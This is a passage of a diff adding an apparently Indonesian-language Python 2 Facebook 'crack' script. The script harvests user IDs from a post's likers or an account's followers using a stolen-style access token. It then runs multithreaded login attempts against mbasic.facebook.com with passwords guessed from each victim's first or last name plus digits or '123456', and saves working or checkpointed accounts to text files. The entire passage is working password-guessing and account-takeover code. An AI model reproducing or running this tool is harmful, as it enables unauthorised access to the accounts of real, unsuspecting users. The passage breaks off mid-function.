+					print '\x1b[0;92m[Berhasil]\x1b[0;97m ' + em + ' \x1b[0;92m\xe2\x88\x86 \x1b[0;97m' + px2
+					oke = open('done/usa.txt', 'a')
+					oke.write('\n[Berhasil] ' + em + ' \xe2\x88\x86 ' + px2)
+					oke.close()
+					oks.append(em)
+				elif 'checkpoint' in xo:
+					print '\x1b[0;95m[Cekpoint]\x1b[0;97m ' + em + ' \x1b[0;95m\xe2\x88\x86\x1b[0;97m ' + px2
+					cek = open('done/usa.txt', 'a')
+					cek.write('\n[Cekpoint] ' + em + ' \xe2\x88\x86 ' + px2)
+					cek.close()
+					cekpoint.append(em)
+				else:
+					px3 = v['first_name'] + '1234'
+					rex = requests.post('https://mbasic.facebook.com/login.php', data = {
+						'email': em,
+						'pass': px3,
+						'login': 'submit' }, headers = {
+						'user-agent': 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]' })
+					xo = rex.content
+					if 'mbasic_logout_button' in xo or 'save-device' in xo:
+						print '\x1b[0;92m[Berhasil]\x1b[0;97m ' + em + ' \x1b[0;92m\xe2\x88\x86 \x1b[0;97m' + px3
+						oke = open('done/usa.txt', 'a')
+						oke.write('\n[Berhasil] ' + em + ' \xe2\x88\x86 ' + px3)
+						oke.close()
+						oks.append(em)
+					elif 'checkpoint' in xo:
+						print '\x1b[0;95m[Cekpoint]\x1b[0;97m ' + em + ' \x1b[0;95m\xe2\x88\x86\x1b[0;97m ' + px3
+						cek = open('done/usa.txt', 'a')
+						cek.write('\n[Cekpoint] ' + em + ' \xe2\x88\x86 ' + px3)
+						cek.close()
+						cekpoint.append(em)
+					else:
+						px4 = '123456'
+						rex = requests.post('https://mbasic.facebook.com/login.php', data = {
+							'email': em,
+							'pass': px4,
+							'login': 'submit' }, headers = {
+							'user-agent': 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]' })
+						xo = rex.content
+						if 'mbasic_logout_button' in xo or 'save-device' in xo:
+							print '\x1b[0;92m[Berhasil]\x1b[0;97m ' + em + ' \x1b[0;92m\xe2\x88\x86 \x1b[0;97m' + px4
+							oke = open('done/usa.txt', 'a')
+							oke.write('\n[Berhasil] ' + em + ' \xe2\x88\x86 ' + px4)
+							oke.close()
+							oks.append(em)
+						elif 'checkpoint' in xo:
+							print '\x1b[0;95m[Cekpoint]\x1b[0;97m ' + em + ' \x1b[0;95m\xe2\x88\x86\x1b[0;97m ' + px4
+							cek = open('done/usa.txt', 'a')
+							cek.write('\n[Cekpoint] ' + em + ' \xe2\x88\x86 ' + px4)
+							cek.close()
+							cekpoint.append(em)
+		except:
+			pass
+		
+
+
+	p = ThreadPool(20)
+	p.map(main, id)
+	print '\x1b[0;93m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
+	time.sleep(0.07)
+	print '\x1b[0;91m\xe2\x80\xa2 \x1b[0;95mSelesai ...'
+	print '\x1b[0;91m\xe2\x80\xa2 \x1b[0;95mTotal \x1b[0;92mOK\x1b[0;97m/\x1b[0;95mCP \x1b[0;97m: \x1b[0;92m' + str(len(oks)) + '\x1b[0;97m/\x1b[0;95m' + str(len(cekpoint))
+	print '\x1b[0;91m\xe2\x80\xa2 \x1b[0;92mOK\x1b[0;97m/\x1b[0;95mCP \x1b[0;95mfile tersimpan \x1b[0;91m: \x1b[0;92mdone/usa.txt'
+	print 50 * '\x1b[0;93m\xe2\x94\x80'
+	raw_input('\x1b[0;97m< \x1b[0;95mKembali\x1b[0;97m >')
+	os.system('python2 crack-2.py')
+
+
+def crack_like():
+	global toket
+	
+	try:
+		toket = open('login.txt', 'r').read()
+	except IOError:
+		print '\x1b[0;91m! Token Invalid'
+		os.system('rm -rf login.txt')
+		time.sleep(1)
+		keluar()
+
+	os.system('clear')
+	print logo
+	print '\x1b[0;93m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
+	time.sleep(0.07)
+	idt = raw_input('\x1b[0;91m\xe2\x80\xa2 \x1b[0;91mID Postingan Publik/Teman \x1b[0;91m:\x1b[0;92m ')
+	time.sleep(0.07)
+	
+	try:
+		r = requests.get('https://graph.facebook.com/' + idt + '/likes?limit=9999999&access_token=' + toket)
+		z = json.loads(r.text)
+		for i in z['data']:
+			id.append(i['id'])
+	except KeyError:
+		print '\x1b[0;91m! ID postingan salah'
+		raw_input('\n\x1b[1;97m< \x1b[0;91mKembali \x1b[0;97m>')
+		menu()
+	except requests.exceptions.SSLError:
+		print '! Koneksi Tidak Ada'
+		exit()
+
+	print '\x1b[0;91m\xe2\x80\xa2 \x1b[0;91mJumlah ID\x1b[0;91m :\x1b[0;92m ' + str(len(id))
+	time.sleep(0.07)
+	print '\x1b[0;91m\xe2\x80\xa2 \x1b[0;91mStop Tekan CTRL+Z'
+	titik = [
+		'.   ',
+		'..  ',
+		'... ']
+	for o in titik:
+		print '\r\x1b[0;91m\xe2\x80\xa2 \x1b[0;91mCrack Berjalan ' + o,
+		sys.stdout.flush()
+		time.sleep(1)
+	
+	print '\n\x1b[0;91m\xe2\x80\xa2 \x1b[0;91mTidak Ada Hasil ? Gunakan Mode Pesawat 1 Detik !'
+	time.sleep(0.07)
+	print '\x1b[0;93m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
+	time.sleep(0.07)
+	
+	def main(arg):
+		em = arg
+		
+		try:
+			os.mkdir('done')
+		except OSError:
+			pass
+
+		
+		try:
+			an = requests.get('https://graph.facebook.com/' + em + '/?access_token=' + toket)
+			v = json.loads(an.text)
+			pc = v['first_name'] + '123'
+			rex = requests.post('https://mbasic.facebook.com/login.php', data = {
+				'email': em,
+				'pass': pc,
+				'login': 'submit' }, headers = {
+				'user-agent': 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]' })
+			xo = rex.content
+			if 'mbasic_logout_button' in xo or 'save-device' in xo:
+				print '\x1b[0;92m[Berhasil]\x1b[0;97m ' + em + ' \x1b[0;92m\xe2\x88\x86 \x1b[0;97m' + pc
+				oke = open('done/like.txt', 'a')
+				oke.write('\n[Berhasil] ' + em + ' \xe2\x88\x86 ' + pc)
+				oke.close()
+				oks.append(em)
+			elif 'checkpoint' in xo:
+				print '\x1b[0;91m[Cekpoint]\x1b[0;97m ' + em + ' \x1b[0;91m\xe2\x88\x86\x1b[0;97m ' + pc
+				cek = open('done/like.txt', 'a')
+				cek.write('\n[Cekpoint] ' + em + ' \xe2\x88\x86 ' + pc)
+				cek.close()
+				cekpoint.append(em)
+			else:
+				pc2 = v['first_name'] + '12345'
+				rex = requests.post('https://mbasic.facebook.com/login.php', data = {
+					'email': em,
+					'pass': pc2,
+					'login': 'submit' }, headers = {
+					'user-agent': 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]' })
+				xo = rex.content
+				if 'mbasic_logout_button' in xo or 'save-device' in xo:
+					print '\x1b[0;92m[Berhasil]\x1b[0;97m ' + em + ' \x1b[0;92m\xe2\x88\x86 \x1b[0;97m' + pc2
+					oke = open('done/like.txt', 'a')
+					oke.write('\n[Berhasil] ' + em + ' \xe2\x88\x86 ' + pc2)
+					oke.close()
+					oks.append(em)
+				elif 'checkpoint' in xo:
+					print '\x1b[0;91m[Cekpoint]\x1b[0;97m ' + em + ' \x1b[0;91m\xe2\x88\x86\x1b[0;97m ' + pc2
+					cek = open('done/like.txt', 'a')
+					cek.write('\n[Cekpoint] ' + em + ' \xe2\x88\x86 ' + pc2)
+					cek.close()
+					cekpoint.append(em)
+				else:
+					pc3 = v['first_name'] + '1234'
+					rex = requests.post('https://mbasic.facebook.com/login.php', data = {
+						'email': em,
+						'pass': pc3,
+						'login': 'submit' }, headers = {
+						'user-agent': 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]' })
+					xo = rex.content
+					if 'mbasic_logout_button' in xo or 'save-device' in xo:
+						print '\x1b[0;92m[Berhasil]\x1b[0;97m ' + em + ' \x1b[0;92m\xe2\x88\x86 \x1b[0;97m' + pc3
+						oke = open('done/like.txt', 'a')
+						oke.write('\n[Berhasil] ' + em + ' \xe2\x88\x86 ' + pc3)
+						oke.close()
+						oks.append(em)
+					elif 'checkpoint' in xo:
+						print '\x1b[0;91m[Cekpoint]\x1b[0;97m ' + em + ' \x1b[0;91m\xe2\x88\x86\x1b[0;97m ' + pc3
+						cek = open('done/like.txt', 'a')
+						cek.write('\n[Cekpoint] ' + em + ' \xe2\x88\x86 ' + pc3)
+						cek.close()
+						cekpoint.append(em)
+					else:
+						pc4 = v['last_name'] + '123'
+						rex = requests.post('https://mbasic.facebook.com/login.php', data = {
+							'email': em,
+							'pass': pc4,
+							'login': 'submit' }, headers = {
+							'user-agent': 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]' })
+						xo = rex.content
+						if 'mbasic_logout_button' in xo or 'save-device' in xo:
+							print '\x1b[0;92m[Berhasil]\x1b[0;97m ' + em + ' \x1b[0;92m\xe2\x88\x86 \x1b[0;97m' + pc4
+							oke = open('done/like.txt', 'a')
+							oke.write('\n[Berhasil] ' + em + ' \xe2\x88\x86 ' + pc4)
+							oke.close()
+							oks.append(em)
+						elif 'checkpoint' in xo:
+							print '\x1b[0;91m[Cekpoint]\x1b[0;97m ' + em + ' \x1b[0;91m\xe2\x88\x86\x1b[0;97m ' + pc4
+							cek = open('done/like.txt', 'a')
+							cek.write('\n[Cekpoint] ' + em + ' \xe2\x88\x86 ' + pc4)
+							cek.close()
+							cekpoint.append(em)
+		except:
+			pass
+		
+
+
+	p = ThreadPool(20)
+	p.map(main, id)
+	print '\x1b[0;93m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
+	time.sleep(0.07)
+	print '\x1b[0;91m\xe2\x80\xa2 \x1b[0;91mSelesai ...'
+	print '\x1b[0;91m\xe2\x80\xa2 \x1b[0;91mTotal \x1b[0;92mOK\x1b[0;97m/\x1b[0;91mCP \x1b[0;97m: \x1b[0;92m' + str(len(oks)) + '\x1b[0;97m/\x1b[0;91m' + str(len(cekpoint))
+	print '\x1b[0;91m\xe2\x80\xa2 \x1b[0;92mOK\x1b[0;97m/\x1b[0;91mCP \x1b[0;91mfile tersimpan \x1b[0;91m: \x1b[0;92mdone/like.txt'
+	print 50 * '\x1b[0;93m\xe2\x94\x80'
+	raw_input('\x1b[0;97m< \x1b[0;91mKembali\x1b[0;97m >')
+	os.system('python2 crack-2.py')
+
+def crack_follow():
+	global toket
+	os.system('clear')
+	
+	try:
+		toket = open('login.txt', 'r').read()
+	except IOError:
+		print '\x1b[0;91m! Token Invalid'
+		os.system('rm -rf login.txt')
+		time.sleep(1)
+		keluar()
+
+	os.system('clear')
+	print logo
+	print '\x1b[0;93m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
+	time.sleep(0.07)
+	print '\x1b[0;93m1.\x1b[0;97m Crack Dari Follower Saya'
+	time.sleep(0.07)
+	print '\x1b[0;93m2.\x1b[0;97m Crack Dari Follower Teman'
+	time.sleep(0.07)
+	print '\x1b[0;91m0.\x1b[0;97m Kembali'
+	time.sleep(0.07)
+	print '\x1b[0;93m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
+	time.sleep(0.07)
+	pilih_follow()
+
+
+def pilih_follow():
+	keak = raw_input('\x1b[0;93m>\x1b[0;97m ')
+	if keak == '':
+		print '\x1b[0;91m! Isi Yg Benar'
+		pilih_follow()
+	elif keak == '1':
+		os.system('clear')
+		print logo
+		print '\x1b[0;93m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
+		time.sleep(0.07)
+		r = requests.get('https://graph.facebook.com/me/subscribers?limit=999999&access_token=' + toket)
+		z = json.loads(r.text)
+		for s in z['data']:
+			id.append(s['id'])
+		
+	elif keak == '2':
+		os.system('clear')
+		print logo
+		print '\x1b[0;93m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
+		time.sleep(0.07)
+		idt = raw_input('\x1b[0;91m\xe2\x80\xa2 \x1b[0;93mID Publik/Teman \x1b[0;91m:\x1b[0;92m ')
+		time.sleep(0.07)
+		
+		try:
+			pok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
+			sp = json.loads(pok.text)
+			print '\x1b[0;91m\xe2\x80\xa2\x1b[0;93m Nama \x1b[0;91m:\x1b[0;92m ' + sp['name']
+		except KeyError:
+			print '\x1b[0;91m! ID publik/teman tidak ada'
+			raw_input('\n\x1b[1;97m< \x1b[0;93mKembali \x1b[0;97m>')
+			crack_follow()
+		except requests.exceptions.ConnectionError:
+			print '\x1b[0;91m! Tidak ada koneksi'
+			keluar()
+
+		r = requests.get('https://graph.facebook.com/' + idt + '/subscribers?limit=999999&access_token=' + toket)
+		z = json.loads(r.text)
+		for i in z['data']:
+			id.append(i['id'])
+		
+	elif keak == '0':
+		menu()
+	else:
+		print '\x1b[0;91m! Isi Yg Benar'
+		pilih_follow()
+	print '\x1b[0;91m\xe2\x80\xa2 \x1b[0;93mJumlah ID\x1b[0;91m :\x1b[0;92m ' + str(len(id))
+	time.sleep(0.07)
+	print '\x1b[0;91m\xe2\x80\xa2 \x1b[0;93mStop Tekan CTRL+Z'
+	titik = [
+		'.   ',
+		'..  ',
+		'... ']
+	for o in titik:
+		print '\r\x1b[0;91m\xe2\x80\xa2 \x1b[0;93mCrack Berjalan ' + o,
+		sys.stdout.flush()
+		time.sleep(1)
+	
+	print '\n\x1b[0;91m\xe2\x80\xa2 \x1b[0;93mTidak Ada Hasil ? Gunakan Mode Pesawat 1 Detik !'
+	time.sleep(0.07)
+	print '\x1b[0;93m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
+	time.sleep(0.07)
+	
+	def main(arg):
+		em = arg
+		
+		try:
+			os.mkdir('done')
+		except OSError:
+			pass
+
+		
+		try:
+			an = requests.get('https://graph.facebook.com/' + em + '/?access_token=' + toket)
+			v = json.loads(an.text)
+			pr = v['first_name'] + '123'
+			rex = requests.post('https://mbasic.facebook.com/login.php', data = {
+				'email': em,
+				'pass': pr,
+				'login': 'submit' }, headers = {
+				'user-agent': 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]' })
+			xo = rex.content
+			if 'mbasic_logout_button' in xo or 'save-device' in xo:
+				print '\x1b[0;92m[Berhasil]\x1b[0;97m ' + em + ' \x1b[0;92m\xe2\x88\x86 \x1b[0;97m' + pr
+				oke = open('done/follow.txt', 'a')
+				oke.write('\n[Berhasil] ' + em + ' \xe2\x88\x86 ' + pr)
+				oke.close()
+				oks.append(em)
+			elif 'checkpoint' in xo:
+				print '\x1b[0;93m[Cekpoint]\x1b[0;97m ' + em + ' \x1b[0;93m\xe2\x88\x86\x1b[0;97m ' + pr
+				cek = open('done/follow.txt', 'a')
+				cek.write('\n[Cekpoint] ' + em + ' \xe2\x88\x86 ' + pr)
+				cek.close()
+				cekpoint.append(em)
+			else:
+				pr2 = v['first_name'] + '12345'
+				rex = requests.post('https://mbasic.facebook.com/login.php', data = {
+					'email': em,
+					'pass': pr2,
+					'login': 'submit' }, headers = {
+					'user-agent': 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]' })
+				xo = rex.content
+				if 'mbasic_logout_button' in xo or 'save-device' in xo:
+					print '\x1b[0;92m[Berhasil]\x1b[0;97m ' + em + ' \x1b[0;92m\xe2\x88\x86 \x1b[0;97m' + pr2
+					oke = open('done/follow.txt', 'a')
+					oke.write('\n[Berhasil] ' + em + ' \xe2\x88\x86 ' + pr2)
+					oke.close()
+					oks.append(em)
+				elif 'checkpoint' in xo:
+					print '\x1b[0;93m[Cekpoint]\x1b[0;97m ' + em + ' \x1b[0;93m\xe2\x88\x86\x1b[0;97m ' + pr2
+					cek = open('done/follow.txt', 'a')
+					cek.write('\n[Cekpoint] ' + em + ' \xe2\x88\x86 ' + pr2)
+					cek.close()
+					cekpoint.append(em)
+				else:
+					pr3 = v['first_name'] + '1234'
+					rex = requests.post('https://mbasic.facebook.com/login.php', data = {
+						'email': em,
+						'pass': pr3,
+						'login': 'submit' }, headers = {
+						'user-agent': 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]' })
+					xo = rex.content
+					if 'mbasic_logout_button' in xo or 'save-device' in xo:
+						print '\x1b[0;92m[Berhasil]\x1b[0;97m ' + em + ' \x1b[0;92m\xe2\x88\x86 \x1b[0;97m' + pr3
+						oke = open('done/follow.txt', 'a')
+						oke.write('\n[Berhasil] ' + em + ' \xe2\x88\x86 ' + pr3)
+						oke.close()
+						oks.append(em)
+					elif 'checkpoint' in xo:
+						print '\x1b[0;93m[Cekpoint]\x1b[0;97m ' + em + ' \x1b[0;93m\xe2\x88\x86\x1b[0;97m ' + pr3
+						cek = open('done/follow.txt', 'a')
+						cek.write('\n[Cekpoint] ' + em + ' \xe2\x88\x86 ' + pr3)
+						cek.close()
+						cekpoint.append(em)
+					else:
+						pr4 = v['first_name'] + '321'
+						rex = requests.post('https://mbasic.facebook.com/login.php', data = {
+							'email': em,
+							'pass': pr4,
+							'login': 'submit' }, headers = {
+							'user-agent': 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]' })
+						xo = rex.content
+						if 'mbasic_logout_button' in xo or 'save-device' in xo:
